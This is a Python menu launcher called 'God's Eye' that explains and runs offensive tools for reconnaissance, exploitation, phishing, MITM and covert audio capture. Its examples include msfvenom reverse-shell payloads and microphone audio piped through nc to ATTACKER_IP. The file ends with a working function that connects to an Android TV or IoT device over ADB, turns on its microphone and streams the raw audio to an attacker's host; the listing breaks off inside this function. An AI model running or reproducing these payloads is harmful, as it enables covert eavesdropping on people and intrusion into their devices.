#!/usr/bin/env python3
"""
============================================================
                 G O D ' S   E Y E
                     OSINT Suite

                 Developed by: Vaishnav Rajeev
                 Contributors: Rishabh Gurnani
============================================================
"""

import os
import sys
import subprocess
import threading
import socket
import time

# ANSI colours
BLUE = "\033[1;34m"
GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"
RED = "\033[1;31m"
MAGENTA = "\033[1;35m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Tool name -> actual Kali binary mapping
# Keys are display names; values are (binary, apt_package)
TOOL_MAP = {
    "amass": ("amass", "amass"),
    "nmap": ("nmap", "nmap"),
    "theHarvester": ("theHarvester", "theharvester"),
    "dnsenum": ("dnsenum", "dnsenum"),
    "dnsrecon": ("dnsrecon", "dnsrecon"),
    "dirb": ("dirb", "dirb"),
    "gobuster": ("gobuster", "gobuster"),
    "ffuf": ("ffuf", "ffuf"),
    "wapiti": ("wapiti", "wapiti"),
    "wpscan": ("wpscan", "wpscan"),
    "aircrack-ng": ("aircrack-ng", "aircrack-ng"),
    "wifite": ("wifite", "wifite"),
    # --- NEW: Exploitation ---
    "metasploit": ("msfconsole", "metasploit-framework"),
    "sqlmap": ("sqlmap", "sqlmap"),
    "hydra": ("hydra", "hydra"),
    "john": ("john", "john"),
    "hashcat": ("hashcat", "hashcat"),
    "searchsploit": ("searchsploit", "exploitdb"),
    # --- NEW: Post-Exploitation ---
    "crackmapexec": ("crackmapexec", "crackmapexec"),
    "chisel": ("chisel", "chisel"),
    # --- NEW: Phishing ---
    "setoolkit": ("setoolkit", "set"),
    "gophish": ("gophish", "gophish"),
    # --- NEW: IoT / Hardware ---
    "bettercap": ("bettercap", "bettercap"),
    "binwalk": ("binwalk", "binwalk"),
    # --- NEW: Audio / Covert ---
    "ffmpeg": ("ffmpeg", "ffmpeg"),
    "sox": ("sox", "sox"),
    "dnscat2": ("dnscat2", "dnscat2"),
    "steghide": ("steghide", "steghide"),
}

# Plain-English descriptions, example usage, and the exact help flag per tool
TOOL_INFO = {
    "amass": {
        "what": [
            "Amass is a subdomain discovery and DNS mapping tool.",
            "It finds every subdomain attached to a target domain",
            "using passive and active reconnaissance techniques.",
        ],
        "example": [
            "amass enum -d example.com",
            "amass enum -d example.com -passive",
            "amass enum -d example.com -brute",
        ],
        "help_cmd": "amass -h",
    },
    "nmap": {
        "what": [
            "Nmap scans a target to find open ports and running services.",
            "It tells you what the target machine has exposed to the network",
            "and what software versions are running on each port.",
        ],
        "example": [
            "nmap -sC -sV 192.168.1.1",
            "nmap -p 1-65535 192.168.1.1",
            "nmap -A example.com",
        ],
        "help_cmd": "nmap -h",
    },
    "theHarvester": {
        "what": [
            "theHarvester collects emails, subdomains, IPs and employee names",
            "from public sources like Google, Bing, LinkedIn and Shodan.",
            "Perfect for building an OSINT profile of a target organisation.",
        ],
        "example": [
            "theHarvester -d example.com -b google",
            "theHarvester -d example.com -b all",
            "theHarvester -d example.com -b linkedin",
        ],
        "help_cmd": "theHarvester -h",
    },
    "dnsenum": {
        "what": [
            "dnsenum enumerates DNS records for a domain.",
            "It finds A, MX, NS and SOA records and attempts zone transfers.",
            "Useful for mapping the DNS infrastructure of a target.",
        ],
        "example": [
            "dnsenum example.com",
            "dnsenum --enum example.com",
            "dnsenum --dnsserver 8.8.8.8 example.com",
        ],
        "help_cmd": "dnsenum --help",
    },
    "dnsrecon": {
        "what": [
            "dnsrecon performs deep DNS reconnaissance on a target domain.",
            "It checks for zone transfers, reverse lookups, SRV records",
            "and can brute-force subdomains from a wordlist.",
        ],
        "example": [
            "dnsrecon -d example.com",
            "dnsrecon -d example.com -t axfr",
            "dnsrecon -d example.com -t brt -D /usr/share/wordlists/dnsmap.txt",
        ],
        "help_cmd": "dnsrecon -h",
    },
    "dirb": {
        "what": [
            "dirb brute-forces hidden directories and files on a web server.",
            "It sends requests to a target URL using a wordlist and reports",
            "every path that returns a valid HTTP response.",
        ],
        "example": [
            "dirb https://example.com",
            "dirb https://example.com /usr/share/wordlists/dirb/common.txt",
            "dirb https://example.com -r -z 100",
        ],
        "help_cmd": "dirb",
    },
    "gobuster": {
        "what": [
            "gobuster is a fast directory, DNS and vhost brute-forcer.",
            "It runs multiple threads simultaneously making it much faster",
            "than older tools like dirb for large wordlists.",
        ],
        "example": [
            "gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt",
            "gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/big.txt -t 50",
        ],
        "help_cmd": "gobuster help",
    },
    "ffuf": {
        "what": [
            "ffuf (Fuzz Faster U Fool) is a high-speed web fuzzer.",
            "It can fuzz directories, parameters, headers and subdomains.",
            "The FUZZ keyword in the URL marks where the wordlist is injected.",
        ],
        "example": [
            "ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt",
            "ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200",
            "ffuf -u https://FUZZ.example.com -w subdomains.txt -H 'Host: FUZZ.example.com'",
        ],
        "help_cmd": "ffuf -h",
    },
    "wapiti": {
        "what": [
            "wapiti scans a web application for common vulnerabilities.",
            "It tests for SQL injection, XSS, file inclusion, SSRF and more",
            "by crawling the target site and sending crafted payloads.",
        ],
        "example": [
            "wapiti -u https://example.com",
            "wapiti -u https://example.com -f html -o /tmp/wapiti_report",
            "wapiti -u https://example.com --scope domain",
        ],
        "help_cmd": "wapiti -h",
    },
    "wpscan": {
        "what": [
            "wpscan is a WordPress security scanner.",
            "It detects vulnerable plugins, themes and WordPress core versions.",
            "It can also enumerate usernames and brute-force passwords.",
        ],
        "example": [
            "wpscan --url https://example.com",
            "wpscan --url https://example.com --enumerate u",
            "wpscan --url https://example.com --enumerate vp --plugins-detection aggressive",
        ],
        "help_cmd": "wpscan --help",
    },
    "aircrack-ng": {
        "what": [
            "aircrack-ng is a complete suite for auditing wireless networks.",
            "It captures WPA/WEP handshakes and cracks them using wordlists.",
            "Must be used on networks you own or have permission to test.",
        ],
        "example": [
            "airmon-ng start wlan0",
            "airodump-ng wlan0mon",
            "aircrack-ng -w /usr/share/wordlists/rockyou.txt capturefile.cap",
        ],
        "help_cmd": "aircrack-ng --help",
    },
    "wifite": {
        "what": [
            "wifite is an automated wireless auditing tool.",
            "It automates the process of capturing handshakes and attacking",
            "WEP, WPA and WPS networks with minimal manual steps.",
        ],
        "example": [
            "sudo wifite",
            "sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt",
            "sudo wifite --kill --wps",
        ],
        "help_cmd": "wifite --help",
    },
    # --- NEW: Exploitation tool descriptions ---
    "metasploit": {
        "what": [
            "Metasploit is the most widely used exploitation framework.",
            "It contains thousands of exploits, payloads, and auxiliary modules",
            "for penetration testing across all platforms.",
        ],
        "example": [
            "msfconsole",
            "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.10; run'",
            "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > payload.elf",
        ],
        "help_cmd": "msfconsole -h",
    },
    "sqlmap": {
        "what": [
            "sqlmap automates detection and exploitation of SQL injection flaws.",
            "It can fingerprint databases, extract data, and even gain shell access",
            "through out-of-band channels when DB permissions allow.",
        ],
        "example": [
            "sqlmap -u 'https://example.com/page?id=1'",
            "sqlmap -u 'https://example.com/page?id=1' --dbs",
            "sqlmap -u 'https://example.com/page?id=1' -D database_name --tables",
        ],
        "help_cmd": "sqlmap --help",
    },
    "hydra": {
        "what": [
            "Hydra is a network login cracker supporting many protocols.",
            "It brute-forces authentication for SSH, FTP, HTTP, SMB, RDP, and more.",
            "Extremely fast — uses parallel connections per target.",
        ],
        "example": [
            "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1",
            "hydra -L users.txt -P pass.txt ftp://192.168.1.1",
            "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
        ],
        "help_cmd": "hydra -h",
    },
    "john": {
        "what": [
            "John the Ripper is a fast offline password cracker.",
            "It supports many hash formats (MD5, SHA, NTLM, bcrypt, etc.)",
            "and auto-detects hash type from the input file.",
        ],
        "example": [
            "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
            "john --show hashes.txt",
            "john --incremental hashes.txt",
        ],
        "help_cmd": "john -h",
    },
    "hashcat": {
        "what": [
            "Hashcat is the world's fastest password recovery utility.",
            "It leverages GPU acceleration to crack hashes at billions of attempts per second.",
            "Supports all major hash modes (MD5, SHA1, SHA256, NTLM, Kerberos, etc.).",
        ],
        "example": [
            "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
            "hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?l?l?l?l",
            "hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show",
        ],
        "help_cmd": "hashcat --help",
    },
    "searchsploit": {
        "what": [
            "Searchsploit lets you search the Exploit-DB archive from your terminal.",
            "Find exact exploits, shellcodes, and papers for a given software/version.",
            "Results include local paths to the exploit source files.",
        ],
        "example": [
            "searchsploit apache 2.4",
            "searchsploit -t linux kernel",
            "searchsploit -p 12345.py",
        ],
        "help_cmd": "searchsploit -h",
    },
    # --- NEW: Post-Exploitation descriptions ---
    "crackmapexec": {
        "what": [
            "CrackMapExec (CME) is a post-exploitation toolkit for Windows/AD environments.",
            "It automates credential spraying, SMB enumeration, PSExec, secrets dumping,",
            "and pivoting across compromised hosts in a domain.",
        ],
        "example": [
            "crackmapexec smb 192.168.1.0/24 -u administrator -H LM:NT hashes.txt",
            "crackmapexec smb 192.168.1.100 -u user -p pass --shares",
            "crackmapexec smb 192.168.1.100 -u user -p pass -x whoami",
        ],
        "help_cmd": "crackmapexec --help",
    },
    "chisel": {
        "what": [
            "Chisel creates fast TCP/UDP tunnels over HTTP.",
            "It's a single binary that works as both client and server,",
            "perfect for pivoting through firewalls in restricted egress environments.",
        ],
        "example": [
            "# On attacker:  chisel server --reverse --port 8000",
            "# On target:    chisel client ATTACKER_IP:8000 R:8080:127.0.0.1:80",
            "chisel server --reverse --port 8000",
        ],
        "help_cmd": "chisel --help",
    },
    # --- NEW: Phishing descriptions ---
    "setoolkit": {
        "what": [
            "The Social-Engineer Toolkit (SET) automates phishing attacks.",
            "It includes website cloning, credential harvesting, email phishing,",
            "and malicious payload generation for social engineering campaigns.",
        ],
        "example": [
            "sudo setoolkit",
            "# Then: 1) Social-Engineering Attacks > 2) Website Attack Vectors > 3) Credential Harvester",
        ],
        "help_cmd": "setoolkit --help",
    },
    "gophish": {
        "what": [
            "GoPhish is an open-source phishing campaign framework.",
            "It provides a web UI to design, launch, and track phishing campaigns",
            "with real-time click/open/credential-submission statistics.",
        ],
        "example": [
            "# Run server: gophish",
            "# Access admin UI at https://127.0.0.1:3333",
            "# Default creds: admin / gophish (change on first login)",
        ],
        "help_cmd": "gophish --help",
    },
    # --- NEW: IoT descriptions ---
    "bettercap": {
        "what": [
            "BetterCap is a powerful MITM framework for network attacks.",
            "It can intercept HTTP/HTTPS, inject JavaScript, sniff credentials,",
            "and perform BLE, Wi-Fi, and Ethernet-level attacks from one interface.",
        ],
        "example": [
            "sudo bettercap -iface wlan0",
            "net.sniff on",
            "https.proxy on",
        ],
        "help_cmd": "bettercap --help",
    },
    "binwalk": {
        "what": [
            "Binwalk analyses and extracts firmware images.",
            "It detects file signatures, filesystems (SquashFS, JFFS2, etc.),",
            "and embedded binaries inside IoT device firmware dumps.",
        ],
        "example": [
            "binwalk firmware.bin",
            "binwalk -Me firmware.bin",
            "binwalk --signature firmware.bin",
        ],
        "help_cmd": "binwalk --help",
    },
    # --- NEW: Audio / Covert descriptions ---
    "ffmpeg": {
        "what": [
            "FFmpeg captures, converts, and streams audio/video from any source.",
            "For audio surveillance: capture microphone input, encode, and stream",
            "to a remote listener over TCP, UDP, or RTSP.",
        ],
        "example": [
            "ffmpeg -f alsa -i default -f wav - | nc ATTACKER_IP 4444",
            "ffmpeg -f pulse -i default -acodec mp3 output.mp3",
            "ffmpeg -f alsa -i hw:0,0 -f rtp rtp://ATTACKER_IP:5555",
        ],
        "help_cmd": "ffmpeg -h",
    },
    "sox": {
        "what": [
            "SoX (Sound eXchange) processes and records audio from the command line.",
            "Lightweight alternative to FFmpeg for basic mic capture and format conversion.",
            "Great for minimal-resource IoT targets.",
        ],
        "example": [
            "rec -t wav - | nc ATTACKER_IP 4444",
            "rec output.wav trim 0 10",
            "sox output.wav -n spectrogram",
        ],
        "help_cmd": "sox --help",
    },
    "dnscat2": {
        "what": [
            "DNSCat2 tunnels data over DNS queries and responses.",
            "It bypasses firewalls that block traditional C2 channels",
            "by encoding data inside DNS requests to a controlled domain.",
        ],
        "example": [
            "# Server:  dnscat2-server your-domain.com",
            "# Client:  dnscat2 --dns server=your-domain.com",
            "dnscat2-server your-domain.com",
        ],
        "help_cmd": "dnscat2 --help",
    },
    "steghide": {
        "what": [
            "Steghide embeds secret data inside image/audio files.",
            "You can hide captured audio payloads inside JPEG, BMP, WAV, or AU files",
            "for covert exfiltration past content inspection filters.",
        ],
        "example": [
            "steghide embed -cf cover.jpg -ef secret.wav -p passphrase",
            "steghide extract -sf stego.jpg -p passphrase",
            "steghide info stego.jpg",
        ],
        "help_cmd": "steghide --help",
    },
}


# ─────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────

def clear_screen():
    os.system("clear")


def header():
    print(f"{RED}{BOLD}")
    print("        *  *  *   G O D ' S   E Y E   *  *  *")
    print(f"{CYAN}  " + "=" * 56)
    print("                     OSINT SUITE")
    print(f"               Developed by: {RED}VAISHNAV RAJEEV{CYAN}")
    print(f"  " + "=" * 56 + f"{RESET}\n")


def pause():
    input(f"\n{BOLD}{CYAN}  [+] Done. Press {GREEN}ENTER{CYAN} to return to menu...{RESET}")


def check_internet() -> bool:
    try:
        socket.setdefaulttimeout(3)
        s = socket.create_connection(("8.8.8.8", 53))
        s.close()
        return True
    except OSError:
        return False


def is_installed(binary: str) -> bool:
    return (
        subprocess.call(
            ["which", binary],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        == 0
    )


def best_terminal():
    """Return an installed graphical terminal emulator, or None."""
    if not (os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")):
        return None
    for term in (
        "qterminal",
        "xfce4-terminal",
        "gnome-terminal",
        "mate-terminal",
        "konsole",
        "terminator",
        "lxterminal",
        "x-terminal-emulator",
        "xterm",
    ):
        if is_installed(term):
            return term
    return None


def open_in_terminal(tool_display: str, script_path: str, wait: bool = False) -> bool:
    """
    Open a shell script in a new graphical terminal window.
    Returns True if a new window was opened, False if we fell back
    to running in the current terminal.
    """
    term = best_terminal()
    title = f"GOD'S EYE | {tool_display.upper()}"

    if term is None:
        subprocess.run(["bash", script_path])
        return False

    # Every terminal emulator has a different flag syntax.
    # We build the exact correct command for each one.
    if term == "qterminal":
        cmd = ["qterminal", "-T", title, "-e", "bash", script_path]
    elif term == "xfce4-terminal":
        # xfce4-terminal --command must receive the full command as ONE string
        cmd = ["xfce4-terminal", "--title", title, "--command", f"bash {script_path}"]
    elif term in ("gnome-terminal", "mate-terminal"):
        # These use -- to separate terminal args from the command
        cmd = [term, "--title", title, "--", "bash", script_path]
    elif term == "konsole":
        cmd = ["konsole", "--title", title, "-e", "bash", script_path]
    elif term == "terminator":
        cmd = ["terminator", "-T", title, "-x", "bash", script_path]
    else:
        # lxterminal, x-terminal-emulator, xterm — all accept -e "cmd"
        cmd = [term, "-e", f"bash {script_path}"]

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        if wait:
            proc.wait()
        return True
    except FileNotFoundError:
        # Terminal vanished between detection and launch
        subprocess.run(["bash", script_path])
        return False


def install_tool_interactive(apt_package: str):
    """Install an apt package in a blocking terminal window."""
    script_path = f"/tmp/godseye_install_{apt_package}.sh"
    with open(script_path, "w") as f:
        f.write(
            "#!/bin/bash\n"
            f"echo '[*] Installing {apt_package}...'\n"
            f"sudo apt-get install -y {apt_package}\n"
            "echo '[+] Done.'\n"
            "read -p 'Press ENTER to close this window...' _\n"
        )
    os.chmod(script_path, 0o755)
    open_in_terminal(f"Install {apt_package}", script_path, wait=True)


# ─────────────────────────────────────────────────────────
# launch_tool — THE ONLY FUNCTION CHANGED FROM THE ORIGINAL
# Opens a clean new terminal showing:
#   1. What the tool does (plain English)
#   2. Example commands with explanations
#   3. The tool's actual --help output
#   4. A live bash shell so the user can run commands freely
# ─────────────────────────────────────────────────────────

def launch_tool(display_name: str):
    """
    Clear the current terminal, print a plain-English description
    and example commands for the selected tool, run its help output,
    then wait for ENTER before returning to the calling menu.
    No new terminal window — everything runs right here.
    """
    if display_name not in TOOL_MAP:
        print(f"{RED}  [!] Unknown tool: {display_name}{RESET}")
        pause()
        return

    binary, apt_pkg = TOOL_MAP[display_name]

    # ── Install check ─────────────────────────────────────────
    clear_screen()
    header()
    if not is_installed(binary):
        ans = input(
            f"  {YELLOW}[!] '{binary}' not found. Install via apt? [y/N]: {RESET}"
        ).strip().lower()
        if ans == "y":
            print(f"  {CYAN}[*] Installing {apt_pkg}...{RESET}\n")
            subprocess.run(
                ["sudo", "apt-get", "install", "-y", apt_pkg],
                text=True,
            )
        else:
            print(f"  {RED}[-] Skipping.{RESET}")
            pause()
            return

    if not is_installed(binary):
        print(f"  {RED}[-] Installation failed or was cancelled.{RESET}")
        pause()
        return

    # ── Pull description data ──────────────────────────────────
    info          = TOOL_INFO.get(display_name, {})
    what_lines    = info.get("what",     [f"{display_name} - no description available."])
    example_lines = info.get("example",  [f"{binary} -h"])
    help_cmd      = info.get("help_cmd", f"{binary} -h")

    # ── Clear and print everything in THIS terminal ────────────
    clear_screen()

    div = CYAN + "  " + "=" * 60 + RESET

    print(div)
    print(f"{RED}{BOLD}  GOD'S EYE  |  {display_name.upper()}{RESET}")
    print(div)
    print()

    print(f"{YELLOW}{BOLD}  WHAT THIS TOOL DOES{RESET}")
    print(CYAN + "  " + "-" * 40 + RESET)
    for line in what_lines:
        print(f"  {line}")
    print()

    print(f"{YELLOW}{BOLD}  EXAMPLE COMMANDS{RESET}")
    print(CYAN + "  " + "-" * 40 + RESET)
    for ex in example_lines:
        print(f"  {GREEN}{ex}{RESET}")
    print()

    print(div)
    print(f"{YELLOW}{BOLD}  HELP OUTPUT  —  {help_cmd}{RESET}")
    print(div)
    print()

    subprocess.run(help_cmd, shell=True)

    print()
    print(div)
    print(f"{CYAN}  Press ENTER to go back to the menu.{RESET}")
    print(div)

    input()



# ─────────────────────────────────────────────────────────
# Anonymity utilities  — UNCHANGED
# ─────────────────────────────────────────────────────────

def get_current_ip(iface: str) -> str:
    try:
        cmd = (
            f"ip -4 addr show {iface} "
            f"| awk '/inet /{{print $2}}' | cut -d/ -f1"
        )
        ip = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.DEVNULL
        ).decode().strip()
        return ip or "none assigned"
    except Exception:
        return "error"


def mac_changer():
    clear_screen()
    header()
    iface = input(
        f"  {BOLD}Enter interface [default: eth0]: {RESET}"
    ).strip() or "eth0"

    if not is_installed("macchanger"):
        print(f"  {YELLOW}[!] macchanger not found. Installing...{RESET}")
        install_tool_interactive("macchanger")

    print(f"  {CYAN}[*] Randomising MAC on {iface}...{RESET}")
    result = subprocess.run(
        ["sudo", "macchanger", "-r", iface],
        capture_output=True,
        text=True,
    )
    print(result.stdout or result.stderr)
    pause()


def ip_changer():
    clear_screen()
    header()
    iface = input(
        f"  {BOLD}Enter interface [default: eth0]: {RESET}"
    ).strip() or "eth0"

    prev_ip = get_current_ip(iface)
    print(f"\n  {CYAN}[*] Previous IP : {prev_ip}{RESET}")
    print(f"  {CYAN}[*] Cycling MAC and requesting new DHCP lease...{RESET}\n")

    cmds = [
        f"sudo ip link set {iface} down",
        f"sudo macchanger -r {iface}",
        f"sudo ip link set {iface} up",
        "sudo systemctl restart NetworkManager",
    ]
    for c in cmds:
        subprocess.run(c, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"  {YELLOW}[*] Waiting for lease...{RESET}", end="", flush=True)
    for _ in range(8):
        time.sleep(1)
        print(".", end="", flush=True)
    print()

    new_ip = get_current_ip(iface)
    print(f"\n  {GREEN}[+] Current IP  : {new_ip}{RESET}")
    pause()


def gods_fix():
    """Restore original MAC and verify connectivity in a background thread."""
    clear_screen()
    header()
    print(f"  {YELLOW}[*] Rolling back network to original MAC...{RESET}\n")

    restore_cmds = [
        "sudo ip link set eth0 down",
        "sudo macchanger -p eth0",
        "sudo ip link set eth0 up",
        "sudo systemctl restart NetworkManager",
    ]
    for c in restore_cmds:
        subprocess.run(c, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def run_ping():
        print(f"  {CYAN}[*] Testing connectivity (4 packets to 8.8.8.8)...{RESET}\n")
        result = subprocess.run(
            ["ping", "-c", "4", "8.8.8.8"],
            capture_output=True,
            text=True,
        )
        print(result.stdout)
        if "0% packet loss" in result.stdout:
            print(f"  {GREEN}[+] Network stable.{RESET}")
        else:
            print(f"  {RED}[!] Packet loss detected. Check your connection.{RESET}")

    t = threading.Thread(target=run_ping, daemon=True)
    t.start()
    t.join()
    pause()


# ─────────────────────────────────────────────────────────
# Browser launchers  — UNCHANGED
# ─────────────────────────────────────────────────────────

def open_url(url: str, label: str):
    clear_screen()
    header()
    print(f"  {CYAN}[*] Opening {label}...{RESET}")
    print(f"  {CYAN}[*] URL: {url}{RESET}\n")
    subprocess.Popen(
        ["xdg-open", url],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    print(f"  {GREEN}[+] Browser process detached.{RESET}")
    pause()


def clone_and_run(label: str, repo_url: str, run_cmd: str):
    """Clone a git repo into /tmp and launch it in a new terminal."""
    clear_screen()
    header()
    folder = repo_url.rstrip("/").split("/")[-1].replace(".git", "")
    dest = f"/tmp/{folder}"
    script_path = f"/tmp/godseye_run_{folder}.sh"

    with open(script_path, "w") as f:
        f.write(
            "#!/bin/bash\n"
            f"echo '[*] Cloning {label}...'\n"
            f"[ -d '{dest}' ] && echo '[*] Already cloned, skipping.' "
            f"|| git clone --depth=1 {repo_url} {dest}\n"
            f"cd {dest}\n"
            f"echo '[*] Launching {label}...'\n"
            f"{run_cmd}\n"
            "exec bash\n"
        )
    os.chmod(script_path, 0o755)
    open_in_terminal(label, script_path)
    print(f"  {GREEN}[+] '{label}' launched in new terminal.{RESET}")
    pause()


# ─────────────────────────────────────────────────────────
# Sub-menus  — UNCHANGED
# ─────────────────────────────────────────────────────────

def host_menu():
    options = {
        "1": ("amass", "Subdomain enumeration"),
        "2": ("nmap", "Port / service scanning"),
        "3": ("theHarvester", "Email & host harvesting"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Host OSINT ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def network_menu():
    options = {
        "1": ("dnsenum", "DNS record enumeration"),
        "2": ("dnsrecon", "DNS zone & record recon"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ DNS Recon ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def web_scan_menu():
    options = {
        "1": ("dirb", "Directory brute-force (wordlist)"),
        "2": ("gobuster", "Directory / DNS brute-force"),
        "3": ("ffuf", "Fast web fuzzer"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Web Scan ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def web_vuln_menu():
    options = {
        "1": ("wapiti", "Web application vulnerability scanner"),
        "2": ("wpscan", "WordPress security scanner"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Web Vulnerability Scan ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def wireless_menu():
    options = {
        "1": ("aircrack-ng", "WPA/WEP handshake analysis"),
        "2": ("wifite", "Automated wireless auditing"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Wireless Audit ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


# ─────────────────────────────────────────────────────────
# NEW: Exploitation menu
# ─────────────────────────────────────────────────────────

def exploitation_menu():
    options = {
        "1": ("metasploit", "Full exploitation framework"),
        "2": ("sqlmap", "SQL injection automation"),
        "3": ("hydra", "Network login brute-forcer"),
        "4": ("john", "Offline password cracker"),
        "5": ("hashcat", "GPU-accelerated hash cracking"),
        "6": ("searchsploit", "Exploit-DB search"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Exploitation ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


# ─────────────────────────────────────────────────────────
# NEW: Post-Exploitation menu
# ─────────────────────────────────────────────────────────

def post_exploit_menu():
    options = {
        "1": ("crackmapexec", "Active Directory post-exploitation"),
        "2": ("chisel", "Tunnelling / pivoting"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Post-Exploitation & Lateral Movement ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


# ─────────────────────────────────────────────────────────
# NEW: Phishing menu
# ─────────────────────────────────────────────────────────

def phishing_menu():
    options = {
        "1": ("setoolkit", "Social-Engineer Toolkit"),
        "2": ("gophish", "Phishing campaign framework"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Phishing & Social Engineering ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


# ─────────────────────────────────────────────────────────
# NEW: IoT / Hardware menu
# ─────────────────────────────────────────────────────────

def iot_menu():
    options = {
        "1": ("bettercap", "MITM framework (Wi-Fi / BLE / Ethernet)"),
        "2": ("binwalk", "Firmware extraction & analysis"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ IoT / Hardware Hacking ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


# ─────────────────────────────────────────────────────────
# NEW: Audio Surveillance menu (for your IoT listening project)
# ─────────────────────────────────────────────────────────

def run_iot_audio_payload():
    """PoC payload: hijack an Android TV / IoT device mic via ADB."""
    clear_screen()
    header()
    print(f"  {YELLOW}[ IoT Audio Hijack — PoC ]{RESET}\n")

    target_ip = input(f"  {BOLD}Target IP (Android TV / smart speaker): {RESET}").strip()
    attacker_ip = input(f"  {BOLD}Your IP (receiving end): {RESET}").strip()
    port = input(f"  {BOLD}Port [4444]: {RESET}").strip() or "4444"

    script = f"""#!/bin/bash
echo "[*] Attempting ADB connect to {target_ip}..."
adb connect {target_ip}:5555 2>/dev/null

echo "[*] Checking device..."
DEVICE=$(adb devices | awk 'NR==2{{print $1}}')
if [ -z "$DEVICE" ]; then
    echo "[!] No device connected. Make sure ADB debugging is enabled."
    exit 1
fi

echo "[+] Connected to $DEVICE"

echo "[*] Attempting mic activation..."
adb shell am start -a android.intent.action.VOICE_COMMAND 2>/dev/null
adb shell am broadcast -a com.google.android.googlequicksearchbox.VOICE_ASSISTANT 2>/dev/null

echo "[*] Checking audio devices..."
adb shell dumpsys media_audio_flinger | grep -i mic -A 5

echo "[*] Attempting audio stream capture..."
adb shell "cat /dev/snd/pcmC0D0c 2>/dev/null" | nc {attacker_ip} {port}

echo "[+] Stream ended."
"""

